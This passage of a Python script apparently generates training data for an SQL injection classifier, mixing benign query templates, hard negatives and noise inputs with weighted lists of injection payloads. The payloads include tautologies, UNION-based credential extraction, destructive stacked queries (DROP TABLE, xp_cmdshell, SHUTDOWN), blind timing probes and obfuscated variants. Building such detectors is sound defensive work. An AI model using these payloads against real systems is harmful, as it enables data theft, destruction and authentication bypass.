        lambda: f"SELECT category_id, COUNT(*) AS product_count, AVG(price) AS avg_price, MIN(price) AS min_price, MAX(price) AS max_price FROM products GROUP BY category_id;",
        lambda: f"SELECT HOUR(created_at) AS hour, COUNT(*) AS signups FROM users GROUP BY HOUR(created_at) ORDER BY hour;",
        lambda: f"SELECT country_code, COUNT(*) AS user_count FROM users GROUP BY country_code ORDER BY user_count DESC LIMIT 10;",
        lambda: f"SELECT status, COUNT(*) AS count, ROUND(COUNT(*) * 100.0 / (SELECT COUNT(*) FROM orders), 2) AS percentage FROM orders GROUP BY status;",
        lambda: f"SELECT * FROM users WHERE user_id NOT IN (SELECT DISTINCT user_id FROM orders);",
        lambda: f"SELECT * FROM products WHERE product_id NOT IN (SELECT DISTINCT product_id FROM order_items);",
        lambda: f"SELECT * FROM users WHERE created_at = (SELECT MAX(created_at) FROM users);",
        lambda: f"SELECT * FROM orders WHERE total_amount = (SELECT MAX(total_amount) FROM orders);",
        lambda: f"SELECT * FROM products WHERE price = (SELECT MIN(price) FROM products WHERE is_active = 1);",
        
        # --- Transaction/session commands ---
        lambda: f"START TRANSACTION;",
        lambda: f"BEGIN;",
        lambda: f"BEGIN WORK;",
        lambda: f"COMMIT;",
        lambda: f"COMMIT WORK;",
        lambda: f"ROLLBACK;",
        lambda: f"ROLLBACK WORK;",
        lambda: f"SAVEPOINT savepoint1;",
        lambda: f"RELEASE SAVEPOINT savepoint1;",
        lambda: f"ROLLBACK TO SAVEPOINT savepoint1;",
        lambda: f"SET autocommit = 1;",
        lambda: f"SET autocommit = 0;",
        lambda: f"SET SESSION autocommit = 1;",
        lambda: f"SET TRANSACTION ISOLATION LEVEL READ COMMITTED;",
        lambda: f"SET TRANSACTION READ ONLY;",
        lambda: f"SET TRANSACTION READ WRITE;",
        lambda: f"LOCK TABLES users READ;",
        lambda: f"LOCK TABLES users WRITE;",
        lambda: f"UNLOCK TABLES;",
        lambda: f"SET NAMES 'utf8mb4';",
        lambda: f"SET CHARACTER SET utf8mb4;",
        lambda: f"SET @variable = 1;",
        lambda: f"SET @user_id = {pick_user_id()};",
        lambda: f"SET @price = {money()};",
        lambda: f"SET @status = {q(random.choice(STATUSES_USER))};",
        lambda: f"SELECT @variable;",
        lambda: f"SELECT @user_id;",
        
        # --- Prepared statements ---
        lambda: f"PREPARE stmt FROM 'SELECT * FROM users WHERE user_id = ?';",
        lambda: f"PREPARE stmt FROM 'SELECT * FROM products WHERE price > ?';",
        lambda: f"PREPARE stmt FROM 'INSERT INTO users (email) VALUES (?)';",
        lambda: f"EXECUTE stmt USING @user_id;",
        lambda: f"EXECUTE stmt USING @price;",
        lambda: f"DEALLOCATE PREPARE stmt;",
        lambda: f"DROP PREPARE stmt;",
        
        # --- Information schema queries (common for admin tools) ---
        lambda: f"SELECT * FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT {limit()};",
        lambda: f"SELECT * FROM information_schema.columns WHERE table_schema = DATABASE() LIMIT {limit()};",
        lambda: f"SELECT table_name, table_rows FROM information_schema.tables WHERE table_schema = DATABASE();",
        lambda: f"SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';",
        lambda: f"SELECT * FROM information_schema.key_column_usage WHERE table_name = 'orders' LIMIT {limit()};",
        lambda: f"SELECT * FROM information_schema.table_constraints WHERE table_name = 'products' LIMIT {limit()};",
        lambda: f"SELECT * FROM information_schema.statistics WHERE table_name = 'users' LIMIT {limit()};",
        lambda: f"SELECT * FROM information_schema.processlist LIMIT {limit()};",
        lambda: f"SELECT * FROM information_schema.user_privileges LIMIT {limit()};",
        
        # --- Maintenance/admin queries ---
        lambda: f"ANALYZE TABLE users;",
        lambda: f"ANALYZE TABLE products;",
        lambda: f"ANALYZE TABLE orders;",
        lambda: f"OPTIMIZE TABLE users;",
        lambda: f"OPTIMIZE TABLE products;",
        lambda: f"OPTIMIZE TABLE orders;",
        lambda: f"CHECK TABLE users;",
        lambda: f"CHECK TABLE products;",
        lambda: f"CHECK TABLE orders;",
        lambda: f"REPAIR TABLE sessions;",
        lambda: f"FLUSH TABLES;",
        lambda: f"FLUSH PRIVILEGES;",
        lambda: f"FLUSH LOGS;",
        lambda: f"FLUSH STATUS;",
        lambda: f"FLUSH HOSTS;",
        lambda: f"RESET QUERY CACHE;",
    ]

    # INSERT templates
    insert_templates = [
        lambda: (lambda fn, ln, cc: f"""INSERT INTO users (email, first_name, last_name, created_at, status, country_code, phone, loyalty_points, newsletter_subscribed)
VALUES ({q(rand_email(fn, ln))}, {q(fn)}, {q(ln)}, {q(rand_date(date(2023,1,1), date(2025,12,21)))}, {q(random.choice(STATUSES_USER))}, {q(cc)}, {q('+' + str(random.randint(1000000000, 9999999999)))}, {random.randint(0, 5000)}, {random.choice([0,1])});""")(random.choice(FIRST_NAMES), random.choice(LAST_NAMES), random.choice([c[0] for c in COUNTRIES])),
        lambda: f"""INSERT INTO orders (user_id, order_date, status, total_amount, currency, shipping_address_id)
VALUES ({pick_user_id()}, {q(rand_date(date(2024,1,1), date(2025,12,21)))}, {q(random.choice(ORDER_STATUS))}, {money()}, {q(random.choice(CURRENCIES))}, {random.randint(1, 100000)});""",
        lambda: f"""INSERT INTO products (sku, name, category_id, price, is_active, stock_quantity, vendor_id, weight)
VALUES ({q('SKU-' + str(random.randint(100000, 999999)))}, {q('Product ' + str(random.randint(1, 200000)))}, {pick_category_id()}, {money()}, {random.choice([0,1])}, {random.randint(0, 1000)}, {pick_vendor_id()}, {random.randint(100, 10000)});""",
        lambda: f"""INSERT INTO support_tickets (user_id, created_at, priority, ticket_status, subject, category)
VALUES ({pick_user_id()}, {q(rand_date(date(2024,1,1), date(2025,12,21)))}, {q(random.choice(PRIORITIES))}, {q(random.choice(['open','pending']))}, {q('Issue #' + str(random.randint(1000, 9999)))}, {q(random.choice(TICKET_CATEGORIES))});""",
        lambda: f"""INSERT INTO product_reviews (product_id, user_id, rating, review_text, created_at, helpful_count, verified_purchase)
VALUES ({pick_product_id()}, {pick_user_id()}, {random.randint(1, 5)}, {q('Review text here')}, {q(rand_date(date(2024,1,1), date(2025,12,21)))}, {random.randint(0, 100)}, {random.choice([0,1])});""",
        lambda: f"""INSERT INTO shipping_addresses (user_id, address_line1, city, state, postal_code, country_code, is_default, phone)
VALUES ({pick_user_id()}, {q(str(random.randint(1, 999)) + ' Main St')}, {q(random.choice(['Istanbul', 'Berlin', 'Paris', 'New York', 'London', 'Tokyo']))}, {q('State')}, {q(str(random.randint(10000, 99999)))}, {q(random.choice([c[0] for c in COUNTRIES]))}, {random.choice([0,1])}, {q('+' + str(random.randint(1000000000, 9999999999)))});""",
        lambda: f"""INSERT INTO cart (user_id, created_at, updated_at, session_id)
VALUES ({pick_user_id()}, {q(rand_date(date(2025,11,1), date(2025,12,21)))}, {q(rand_date(date(2025,11,1), date(2025,12,21)))}, {q('session-' + str(random.randint(100000, 999999)))});""",
        lambda: f"""INSERT INTO wishlists (user_id, product_id, added_at, priority)
VALUES ({pick_user_id()}, {pick_product_id()}, {q(rand_date(date(2024,1,1), date(2025,12,21)))}, {random.randint(1, 5)});""",
        lambda: f"""INSERT INTO subscriptions (user_id, plan_name, price, billing_cycle, start_date, status, auto_renew)
VALUES ({pick_user_id()}, {q(random.choice(SUBSCRIPTION_PLANS))}, {money()}, {q(random.choice(BILLING_CYCLES))}, {q(rand_date(date(2024,1,1), date(2025,12,21)))}, {q('active')}, {random.choice([0,1])});""",
        lambda: f"""INSERT INTO notifications (user_id, type, title, message, is_read, created_at)
VALUES ({pick_user_id()}, {q(random.choice(NOTIFICATION_TYPES))}, {q('Notification Title')}, {q('Notification message body')}, 0, {q(rand_date(date(2025,12,1), date(2025,12,21)))});""",
        lambda: f"""INSERT INTO returns (order_id, user_id, return_date, reason, status, refund_amount)
VALUES ({pick_order_id()}, {pick_user_id()}, {q(rand_date(date(2025,1,1), date(2025,12,21)))}, {q(random.choice(RETURN_REASONS))}, {q(random.choice(RETURN_STATUS))}, {money()});""",
        lambda: f"""INSERT INTO categories (category_name, parent_category_id, description, is_active)
VALUES ({q(random.choice(PRODUCT_CATEGORIES))}, {random.choice([None, random.randint(1, 20)])}, {q('Category description')}, 1);""",
        lambda: f"""INSERT INTO vendors (vendor_name, contact_email, phone, country_code, rating, is_active, joined_at)
VALUES ({q('Vendor ' + str(random.randint(1, 10000)))}, {q('vendor@example.com')}, {q('+' + str(random.randint(1000000000, 9999999999)))}, {q(random.choice([c[0] for c in COUNTRIES]))}, {random.uniform(3.0, 5.0):.1f}, 1, {q(rand_date(date(2020,1,1), date(2025,1,1)))});""",
    ]

    # UPDATE templates
    update_templates = [
        lambda: f"UPDATE users SET status = {q(random.choice(STATUSES_USER))}, loyalty_points = {random.randint(0, 5000)} WHERE user_id = {pick_user_id()};",
        lambda: f"UPDATE orders SET status = {q(random.choice(ORDER_STATUS))}, updated_at = {q(rand_date(date(2025,1,1), date(2025,12,21)))} WHERE order_id = {pick_order_id()};",
        lambda: f"UPDATE products SET price = {money()}, is_active = {random.choice([0,1])}, stock_quantity = {random.randint(0, 500)} WHERE product_id = {pick_product_id()};",
        lambda: f"UPDATE support_tickets SET ticket_status = {q(random.choice(['open','pending','closed','in_progress']))}, assigned_to = {random.randint(1, 50)} WHERE ticket_id = {random.randint(1, 250000)};",
        lambda: f"UPDATE sessions SET ended_at = {q(rand_date(date(2024,1,1), date(2025,12,21)))}, page_views = {random.randint(1, 100)} WHERE session_id = {random.randint(1, 800000)};",
        lambda: f"UPDATE product_reviews SET helpful_count = {random.randint(0, 200)} WHERE review_id = {pick_review_id()};",
        lambda: f"UPDATE inventory SET quantity = {random.randint(0, 1000)}, last_updated = {q(rand_date(date(2025,1,1), date(2025,12,21)))} WHERE product_id = {pick_product_id()} AND warehouse_id = {pick_warehouse_id()};",
        lambda: f"UPDATE subscriptions SET status = {q(random.choice(['active', 'cancelled', 'expired']))}, auto_renew = {random.choice([0,1])} WHERE subscription_id = {pick_subscription_id()};",
        lambda: f"UPDATE notifications SET is_read = 1, read_at = {q(rand_date(date(2025,12,1), date(2025,12,21)))} WHERE notification_id = {random.randint(1, 1000000)} AND user_id = {pick_user_id()};",
        lambda: f"UPDATE returns SET status = {q(random.choice(RETURN_STATUS))}, processed_by = {random.randint(1, 50)}, processed_at = {q(rand_date(date(2025,1,1), date(2025,12,21)))} WHERE return_id = {random.randint(1, 100000)};",
        lambda: f"UPDATE cart SET updated_at = {q(rand_date(date(2025,12,1), date(2025,12,21)))} WHERE cart_id = {random.randint(1, 500000)};",
        lambda: f"UPDATE coupons SET times_used = times_used + 1 WHERE coupon_id = {random.randint(1, 10000)};",
    ]

    # DELETE templates
    delete_templates = [
        lambda: f"DELETE FROM sessions WHERE ended_at < {q(rand_date(date(2022,1,1), date(2023,12,31)))};",
        lambda: f"DELETE FROM support_tickets WHERE ticket_status = {q('closed')} AND created_at < {q(rand_date(date(2022,1,1), date(2023,12,31)))};",
        lambda: f"DELETE FROM order_items WHERE order_id = {pick_order_id()} AND quantity = 0;",
        lambda: f"DELETE FROM users WHERE status = {q('inactive')} AND created_at < {q(rand_date(date(2020,1,1), date(2021,12,31)))};",
        lambda: f"DELETE FROM cart_items WHERE cart_id IN (SELECT cart_id FROM cart WHERE updated_at < {q(rand_date(date(2023,1,1), date(2024,12,31)))});",
        lambda: f"DELETE FROM notifications WHERE is_read = 1 AND created_at < {q(rand_date(date(2024,1,1), date(2024,12,31)))};",
        lambda: f"DELETE FROM product_reviews WHERE rating < 2 AND helpful_count = 0 AND created_at < {q(rand_date(date(2023,1,1), date(2024,1,1)))};",
        lambda: f"DELETE FROM audit_logs WHERE timestamp < {q(rand_date(date(2024,1,1), date(2024,6,30)))};",
        lambda: f"DELETE FROM wishlists WHERE added_at < {q(rand_date(date(2022,1,1), date(2023,12,31)))};",
        lambda: f"DELETE FROM coupons WHERE valid_until < {q(rand_date(date(2024,1,1), date(2024,12,31)))} AND times_used = 0;",
    ]

    return select_templates, insert_templates, update_templates, delete_templates

select_t, insert_t, update_t, delete_t = build_templates()

# =============================================================================
# SQLi PAYLOAD CONSTANTS (for malicious mode)
# =============================================================================

# Tautology-based injection payloads
SQLI_TAUTOLOGY = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 'x'='x",
    "' OR ''='",
    "' OR 1=1/*",
    "1' OR '1'='1",
    "admin'--",
    "' OR 1=1 OR '",
    "') OR ('1'='1",
    "') OR 1=1--",
    "' OR 1=1; --",
    "' OR 'a'='a",
    "1 OR 1=1",
    "' OR 1 --",
]

# UNION-based injection payloads
SQLI_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password FROM users--",
    "' UNION SELECT @@version--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "' UNION SELECT column_name FROM information_schema.columns--",
    "' UNION SELECT NULL,CONCAT(username,':',password) FROM users--",
    "' UNION SELECT 1,user(),database()--",
    "1' UNION SELECT * FROM users--",
]

# Comment-based injection payloads
SQLI_COMMENT = [
    "admin'/*",
    "admin'--",
    "admin'#",
    "'; -- comment",
    "'; # comment",
    "/**/",
    "' /*comment*/ OR 1=1--",
    "1'/**/OR/**/1=1--",
    "'-- -",
    "'#",
    "admin'-- -",
    "/**/'/**/OR/**/1=1--",
]

# Stacked query injection payloads
SQLI_STACKED = [
    "'; DROP TABLE users--",
    "'; DROP TABLE orders--",
    "'; DELETE FROM users--",
    "'; INSERT INTO users VALUES('hacker','hacked')--",
    "'; UPDATE users SET password='hacked'--",
    "'; TRUNCATE TABLE sessions--",
    "'; CREATE TABLE hacked(data TEXT)--",
    "1; DROP TABLE products--",
    "'; EXEC xp_cmdshell('dir')--",
    "'; SHUTDOWN--",
    "'; ALTER TABLE users ADD hacked INT--",
    "1'; DROP DATABASE test--",
]

# Time-based blind injection payloads
SQLI_TIME_BLIND = [
    "' AND SLEEP(5)--",
    "' AND SLEEP(10)--",
    "1' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; WAITFOR DELAY '0:0:10'--",
    "' AND BENCHMARK(10000000,SHA1('test'))--",
    "' AND (SELECT SLEEP(5))--",
    "1' AND IF(1=1,SLEEP(5),0)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' AND pg_sleep(5)--",
    "'; SELECT pg_sleep(5)--",
]

# Error-based injection payloads
SQLI_ERROR_BASED = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND GTID_SUBSET(@@version,1)--",
    "' AND EXP(~(SELECT * FROM (SELECT @@version)a))--",
    "' AND JSON_KEYS((SELECT CONVERT((SELECT @@version) USING utf8)))--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=CAST(@@version AS INT)--",
    "' HAVING 1=1--",
    "' GROUP BY columnname HAVING 1=1--",
    "' ORDER BY 1--",
    "' ORDER BY 100--",
]

# Boolean-based blind injection payloads
SQLI_BOOLEAN_BLIND = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a'--",
    "' AND 'a'='b'--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND ASCII(SUBSTRING((SELECT user()),1,1))>100--",
    "' AND (SELECT COUNT(*) FROM users)>0--",
    "' AND LENGTH(database())>5--",
    "' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>50--",
    "1' AND 1=1 AND '1'='1",
    "1' AND 1=2 AND '1'='1",
    "' AND EXISTS(SELECT * FROM users)--",
]

# Obfuscated payloads - mixed casing
SQLI_OBFUSCATED_CASE = [
    "' oR '1'='1",
    "' Or 1=1--",
    "' OR 1=1#",
    "' uNiOn SeLeCt NuLl--",
    "' UnIoN sElEcT 1,2,3--",
    "' aNd SlEeP(5)--",
    "' AnD 1=1--",
    "'; dRoP tAbLe UsErS--",
]

# Obfuscated payloads - whitespace noise (tabs, newlines, multiple spaces)
SQLI_OBFUSCATED_WHITESPACE = [
    "'  OR   '1'='1",
    "'\tOR\t1=1--",
    "'\nOR\n1=1--",
    "' \t OR \t 1=1--",
    "'  UNION  SELECT  NULL--",
    "'\t\tUNION\t\tSELECT\t\t1,2,3--",
    "'   AND   SLEEP(5)--",
]

# Obfuscated payloads - inline comments
SQLI_OBFUSCATED_COMMENTS = [
    "'/**/OR/**/1=1--",
    "'/*x*/OR/*y*/'1'='1",
    "' /*!OR*/ 1=1--",
    "'/**/UNION/**/SELECT/**/NULL--",
    "'/*abc*/UNION/*def*/SELECT/*ghi*/1,2,3--",
    "' /*!50000OR*/ 1=1--",
    "'/*! OR */1=1--",
    "admin'/**/--",
    "'/*comment*/AND/*comment*/1=1--",
]

# Obfuscated payloads - concatenation tricks
SQLI_OBFUSCATED_CONCAT = [
    "' OR 'a'||'b'='ab",
    "' OR CONCAT('1','1')='11",
    "' OR CHR(49)||CHR(61)||CHR(49)--",
    "' UNION SELECT CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)--",
    "' OR 'x'+'y'='xy",
    "' AND CONCAT(0x27,0x4f,0x52)--",
    "' OR 0x31=0x31--",  # hex encoded 1=1
    "' UNION SELECT 0x61646d696e--",  # hex 'admin'
]

# Obfuscated payloads - URL encoded fragments (partially decoded in SQL)
SQLI_OBFUSCATED_ENCODED = [
    "' %4fR 1=1--",  # %4f = O
    "' OR%201=1--",  # %20 = space
    "'%27 OR 1=1--",  # %27 = '
    "' %55NION %53ELECT NULL--",  # %55=U, %53=S
    "' OR 1%3d1--",  # %3d = =
    "' AN%44 1=1--",  # %44 = D
    "'%20OR%20'1'='1",
    "admin%27--",  # %27 = '
]

# All payload categories with weights (tautology most common, stacked less common)
SQLI_PAYLOADS = [
    (SQLI_TAUTOLOGY, 0.20),           # 20% - most common attack
    (SQLI_UNION, 0.15),               # 15% - data extraction
    (SQLI_COMMENT, 0.10),             # 10% - bypass filters
    (SQLI_BOOLEAN_BLIND, 0.10),       # 10% - blind detection
    (SQLI_TIME_BLIND, 0.08),          # 8% - blind timing
    (SQLI_ERROR_BASED, 0.07),         # 7% - error extraction
    (SQLI_STACKED, 0.05),             # 5% - destructive (rare)
    # Obfuscation variants (25% total)
    (SQLI_OBFUSCATED_CASE, 0.06),     # 6% - mixed case
    (SQLI_OBFUSCATED_WHITESPACE, 0.05), # 5% - whitespace noise
    (SQLI_OBFUSCATED_COMMENTS, 0.06),  # 6% - inline comments
    (SQLI_OBFUSCATED_CONCAT, 0.04),    # 4% - concatenation tricks
    (SQLI_OBFUSCATED_ENCODED, 0.04),   # 4% - URL-encoded fragments
]

def pick_sqli_payload() -> str:
    """Select a random SQLi payload using weighted distribution."""
    r = random.random()
    cumulative = 0.0
    for payloads, weight in SQLI_PAYLOADS:
        cumulative += weight
        if r < cumulative:
            return random.choice(payloads)
    # Fallback to tautology
    return random.choice(SQLI_TAUTOLOGY)

# =============================================================================
# HARD NEGATIVE TEMPLATES (benign queries that look suspicious but are safe)
# These reduce trivial separability in the ML model
# =============================================================================

HARD_NEGATIVE_TEMPLATES = [
    # Benign OR conditions (not tautologies)
    lambda: f"""SELECT user_id, email, first_name, last_name FROM users
WHERE (status = {q('active')} OR status = {q('verified')})
AND created_at >= {q(rand_date(date(2024,1,1), date(2025,12,21)))}
ORDER BY user_id LIMIT {limit()};""",
    
    lambda: f"""SELECT order_id, user_id, total_amount FROM orders
WHERE (status = {q('paid')} OR status = {q('processing')} OR status = {q('shipped')})
AND order_date BETWEEN {q(rand_date(date(2024,1,1), date(2024,12,31)))} AND {q(rand_date(date(2025,1,1), date(2025,12,21)))}
ORDER BY order_date DESC LIMIT {limit()};""",
    
    lambda: f"""SELECT p.product_id, p.name, p.price FROM products p
WHERE (p.category_id = {pick_category_id()} OR p.category_id = {pick_category_id()})
AND p.is_active = 1
ORDER BY p.price LIMIT {limit()};""",
    
    # Nested parentheses (complex but safe conditions)
    lambda: f"""SELECT u.user_id, u.email FROM users u
WHERE ((u.status = {q('active')} AND u.country_code = {q(random.choice([c[0] for c in COUNTRIES]))})
    OR (u.status = {q('verified')} AND u.loyalty_points > {random.randint(100, 1000)}))
ORDER BY u.created_at DESC LIMIT {limit()};""",
    
    lambda: f"""SELECT o.order_id, o.total_amount FROM orders o
WHERE (((o.status = {q('paid')}) AND (o.total_amount > {money()}))
    OR ((o.status = {q('shipped')}) AND (o.total_amount <= {money()})))
ORDER BY o.order_date DESC LIMIT {limit()};""",
    
    lambda: f"""SELECT * FROM products
WHERE ((is_active = 1) AND ((price > 50.00 AND price < 500.00) OR (stock_quantity > 100)))
ORDER BY price DESC LIMIT {limit()};""",
    
    # Quoted strings containing -- (legitimate comment-like data, not SQL comments)
    lambda: f"""INSERT INTO support_tickets (user_id, subject, category, priority)
VALUES ({pick_user_id()}, {q('Issue with order -- please help urgently')}, {q('shipping')}, {q('high')});""",
    
    lambda: f"""INSERT INTO product_reviews (product_id, user_id, rating, review_text)
VALUES ({pick_product_id()}, {pick_user_id()}, {random.randint(3, 5)}, {q('Great product -- exceeded my expectations! Would recommend.')});""",
    
    lambda: f"""UPDATE support_tickets SET subject = {q('Follow-up -- still waiting for response')}
WHERE ticket_id = {random.randint(1, 250000)};""",
    
    lambda: f"""INSERT INTO notifications (user_id, type, title, message)
VALUES ({pick_user_id()}, {q('reminder')}, {q('Action needed -- verify your email')}, {q('Please verify your email address -- click the link we sent.')});""",
    
    # Strings with SQL-like keywords inside quotes (legitimate data)
    lambda: f"""INSERT INTO products (sku, name, description, category_id, price, is_active)
VALUES ({q('SKU-UNION-' + str(random.randint(1000, 9999)))}, {q('Union Jack Flag Set')}, {q('Select this beautiful Union Jack design')}, {pick_category_id()}, {money()}, 1);""",
    
    lambda: f"""INSERT INTO categories (category_name, description)
VALUES ({q('Sleep & Bedding')}, {q('Products for better sleep -- includes mattresses, pillows, and bedding accessories.')});""",
    
    lambda: f"""SELECT * FROM products WHERE name = {q('Drop Dead Gorgeous Dress')} AND is_active = 1;""",
    
    lambda: f"""INSERT INTO vendors (vendor_name, contact_email)
VALUES ({q('SELECT Electronics Ltd')}, {q('contact@selectelectronics.com')});""",
    
    # Complex expressions with multiple ANDs/ORs
    lambda: f"""SELECT t.ticket_id, t.subject, t.priority FROM support_tickets t
WHERE (t.priority = {q('high')} OR t.priority = {q('critical')})
AND (t.ticket_status = {q('open')} OR t.ticket_status = {q('pending')})
AND t.created_at >= {q(rand_date(date(2025,1,1), date(2025,12,21)))}
ORDER BY t.priority DESC, t.created_at ASC LIMIT {limit()};""",
    
    lambda: f"""SELECT p.product_id, p.name, p.price FROM products p
WHERE (p.price >= 10.00 AND p.price <= 100.00)
OR (p.category_id = {pick_category_id()} AND p.stock_quantity > 0)
ORDER BY p.price ASC LIMIT {limit()};""",
    
    # LIKE patterns that look suspicious but are safe
    lambda: f"""SELECT user_id, email FROM users
WHERE email LIKE {q('%or%')} AND status = {q('active')}
ORDER BY created_at DESC LIMIT {limit()};""",
    
    lambda: f"""SELECT product_id, name FROM products
WHERE name LIKE {q('%select%')} OR name LIKE {q('%union%')}
ORDER BY name LIMIT {limit()};""",
    
    # Subqueries with complex conditions
    lambda: f"""SELECT u.user_id, u.email FROM users u
WHERE u.user_id IN (
    SELECT DISTINCT o.user_id FROM orders o
    WHERE (o.status = {q('paid')} OR o.status = {q('shipped')})
    AND o.total_amount > {money()}
)
ORDER BY u.user_id LIMIT {limit()};""",
    
    # Strings containing single quotes (properly escaped)
    lambda: f"""INSERT INTO product_reviews (product_id, user_id, rating, review_text)
VALUES ({pick_product_id()}, {pick_user_id()}, 5, {q("It''s the best product I''ve ever bought!")});""",
    
    lambda: f"""UPDATE users SET first_name = {q("O''Brien")} WHERE user_id = {pick_user_id()};""",
    
    # Numbers that look like injection but aren't
    lambda: f"""SELECT * FROM orders WHERE order_id = 1 AND user_id = 1 ORDER BY order_date LIMIT 10;""",
    
    lambda: f"""SELECT * FROM users WHERE user_id = 1 OR user_id = 2 OR user_id = 3 LIMIT 3;""",
    
    # === ENHANCED HARD NEGATIVES FOR ATTACK SIGNATURE GENERALIZATION ===
    
    # Legitimate UNION queries (same column count, same types - NOT attacks)
    lambda: f"""SELECT first_name, last_name FROM users
UNION SELECT vendor_name, contact_email FROM vendors
ORDER BY first_name LIMIT {limit()};""",
    
    lambda: f"""SELECT product_id, name FROM products WHERE is_active = 1
UNION ALL SELECT product_id, name FROM products WHERE stock_quantity = 0
ORDER BY product_id LIMIT {limit()};""",
    
    lambda: f"""SELECT email FROM users WHERE country_code = 'US'
UNION SELECT email FROM users WHERE country_code = 'GB'
ORDER BY email LIMIT {limit()};""",
    
    lambda: f"""SELECT category_name FROM categories WHERE parent_category_id IS NULL
UNION SELECT category_name FROM categories WHERE is_active = 1
ORDER BY category_name;""",
    
    # Legitimate SQL comments in code/stored procedures (NOT injection)
    lambda: f"""SELECT * FROM users 
-- Filter by active users only
WHERE status = 'active' 
ORDER BY created_at DESC LIMIT {limit()};""",
    
    lambda: f"""SELECT product_id, name, price FROM products
/* Get products in specific price range */
WHERE price BETWEEN 10.00 AND 100.00
ORDER BY price;""",
    
    lambda: f"""SELECT o.order_id, o.total_amount
-- Join with users to get customer info
FROM orders o
JOIN users u ON o.user_id = u.user_id
WHERE o.status = 'paid' LIMIT {limit()};""",
    
    # Strings with SQL escape sequences (legitimate, not attacks)
    lambda: f"""SELECT * FROM users WHERE bio LIKE '%don''t%';""",
    lambda: f"""SELECT * FROM products WHERE description LIKE '%it''s great%';""",
    lambda: f"""INSERT INTO reviews (text) VALUES ('Can''t believe how good this is!');""",
    
    # Legitimate percentage/wildcard patterns  
    lambda: f"""SELECT * FROM products WHERE name LIKE '%25%off%';""",
    lambda: f"""SELECT * FROM coupons WHERE coupon_code LIKE 'SAVE%';""",
    lambda: f"""SELECT * FROM users WHERE email LIKE '%@gmail.com';""",
    
    # Complex boolean logic (legitimate filtering, not tautologies)
    lambda: f"""SELECT * FROM products 
WHERE (category_id = 1 AND is_active = 1) 
   OR (category_id = 2 AND stock_quantity > 0)
   OR (price < 10.00 AND vendor_id = {pick_vendor_id()});""",
    
    lambda: f"""SELECT * FROM orders
WHERE (status = 'pending' AND total_amount > 100)
   OR (status = 'processing' AND order_date > '2024-01-01')
   OR (user_id = {pick_user_id()} AND status = 'paid');""",
    
    # Legitimate numeric comparisons that aren't tautologies
    lambda: f"""SELECT * FROM products WHERE 1 = 1 AND price > 50.00;""",  # 1=1 is common boilerplate
    lambda: f"""SELECT * FROM users WHERE 1 = 1 AND status = 'active' ORDER BY user_id;""",
    lambda: f"""SELECT * FROM orders WHERE 1 = 0 OR total_amount > 1000;""",  # OR with real condition
    
    # Sleep/delay function names in legitimate data
    lambda: f"""SELECT * FROM products WHERE name = 'Sleep Mask Pro';""",
    lambda: f"""SELECT * FROM products WHERE category_id IN (SELECT category_id FROM categories WHERE category_name = 'Sleep & Relaxation');""",
    lambda: f"""INSERT INTO categories (category_name) VALUES ('Sleep Accessories');""",
    
    # Benchmark/performance test queries (legitimate admin queries)
    lambda: f"""SELECT COUNT(*) FROM users; -- benchmark query""",
    lambda: f"""SELECT SQL_NO_CACHE * FROM products LIMIT 100; -- performance test""",
    
    # Hash/version check in legitimate contexts
    lambda: f"""SELECT * FROM settings WHERE setting_name = 'db_version';""",
    lambda: f"""SELECT * FROM audit_logs WHERE action = 'version_check';""",
    lambda: f"""INSERT INTO system_info (key, value) VALUES ('app_version', '1.0.0');""",
]

# =============================================================================
# BENIGN NOISE PATTERNS (non-SQL inputs that should be classified as benign)
# These teach the model to recognize attack signatures, not just "is SQL"
# =============================================================================

BENIGN_NOISE_PATTERNS = [
    # SQL keywords in isolation (legitimate input, not attacks)
    lambda: random.choice(["SELECT", "FROM", "WHERE", "ORDER BY", "LIMIT", "AND", "OR", "INSERT", "UPDATE", "DELETE", "JOIN", "GROUP BY", "HAVING", "DISTINCT"]),
    
    # Common text fragments that might appear in user input
    lambda: random.choice(["hello", "test", "admin", "user", "search", "query", "login", "password", "email", "name"]),
    
    # Numbers and IDs (very common benign input)
    lambda: str(random.randint(1, 999999)),
    lambda: f"{random.randint(10000000, 99999999)}{random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')}",
    
    # Special characters that appear in legitimate data but not as attacks
    lambda: random.choice(["@", "&", "%", "*", "#", "()", "[]", "{}", "|", "^"]),
    
    # Simple expressions that aren't SQL
    lambda: f"{random.randint(1, 100)} + {random.randint(1, 100)}",
    lambda: f"{random.randint(1, 100)} - {random.randint(1, 100)}",
    lambda: f"{random.randint(1, 100)} * {random.randint(1, 100)}",
    
    # Email addresses (benign user data)
    lambda: f"{random.choice(['john', 'jane', 'admin', 'user', 'test'])}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'company.org'])}",
    
    # Phone-like numbers
    lambda: f"+{random.randint(1, 99)}{random.randint(100000000, 999999999)}",
    
    # Date-like strings
    lambda: f"{random.randint(2020, 2025)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
    
    # URL fragments (benign)
    lambda: f"/{random.choice(['users', 'products', 'orders', 'api', 'v1', 'v2'])}/{random.randint(1, 9999)}",
    
    # JSON-like strings (benign data)
    lambda: f'{{"id": {random.randint(1, 1000)}, "name": "test"}}',
    
    # Empty or minimal valid inputs
    lambda: "",
    lambda: " ",
    lambda: "null",
    lambda: "NULL",
    lambda: "undefined",
    lambda: "true",
